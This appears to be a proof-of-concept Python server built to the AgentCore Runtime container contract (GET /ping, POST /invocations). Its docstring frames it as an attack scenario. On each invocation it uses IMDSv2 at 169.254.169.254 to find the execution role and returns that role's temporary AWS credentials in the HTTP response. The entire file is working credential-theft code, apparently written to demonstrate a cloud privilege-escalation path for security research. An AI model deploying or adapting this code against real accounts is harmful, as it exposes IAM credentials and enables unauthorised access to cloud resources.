#!/usr/bin/env python3
"""
Minimal HTTP server satisfying the AgentCore Runtime container contract.

AgentCore Runtime requires the container to serve two endpoints on port 8080:
  GET  /ping         - health check; runtime platform polls this until READY
  POST /invocations  - invocation endpoint; called via InvokeAgentRuntime

In the attack scenario the attacker invokes the runtime via InvokeAgentRuntime.
The container reads the execution role's temporary credentials from MMDS at
169.254.169.254 and returns them as JSON in the HTTP response body.
"""

import json
import os
import http.server
import urllib.request


class RuntimeHandler(http.server.BaseHTTPRequestHandler):
    """Request handler implementing the AgentCore Runtime HTTP interface."""

    def log_message(self, fmt, *args):  # noqa: N802
        print(f"[runtime] {self.address_string()} - {fmt % args}")

    def do_GET(self):  # noqa: N802
        if self.path == "/ping":
            self._respond(200, {"status": "healthy"})
        else:
            self._respond(404, {"error": "not found"})

    def do_POST(self):  # noqa: N802
        if self.path == "/invocations":
            # Drain the request body (ignored — credentials come from MMDS, not the payload)
            content_length = int(self.headers.get("Content-Length", 0))
            if content_length > 0:
                self.rfile.read(content_length)

            creds = self._fetch_mmds_credentials()
            self._respond(200, creds)
        else:
            self._respond(404, {"error": "not found"})

    def _respond(self, status_code: int, body: dict) -> None:
        encoded = json.dumps(body).encode("utf-8")
        self.send_response(status_code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(encoded)))
        self.end_headers()
        self.wfile.write(encoded)

    def _fetch_mmds_credentials(self) -> dict:
        """Read the execution role's temporary credentials from MMDS via IMDSv2."""
        try:
            # Step 1: obtain IMDSv2 session token
            token_req = urllib.request.Request(
                "http://169.254.169.254/latest/api/token",
                method="PUT",
                headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
            )
            with urllib.request.urlopen(token_req, timeout=5) as resp:
                token = resp.read().decode().strip()

            # Step 2: discover the attached role name
            role_req = urllib.request.Request(
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                headers={"X-aws-ec2-metadata-token": token},
            )
            with urllib.request.urlopen(role_req, timeout=5) as resp:
                role_name = resp.read().decode().strip()

            # Step 3: fetch the credentials for that role
            creds_req = urllib.request.Request(
                f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}",
                headers={"X-aws-ec2-metadata-token": token},
            )
            with urllib.request.urlopen(creds_req, timeout=5) as resp:
                return json.loads(resp.read())

        except Exception as exc:  # noqa: BLE001
            print(f"[runtime] MMDS fetch failed: {exc}")
            return {"error": str(exc)}


def main() -> None:
    port = int(os.environ.get("PORT", "8080"))
    httpd = http.server.HTTPServer(("", port), RuntimeHandler)
    print(f"[runtime] listening on port {port}")
    httpd.serve_forever()


if __name__ == "__main__":
    main()
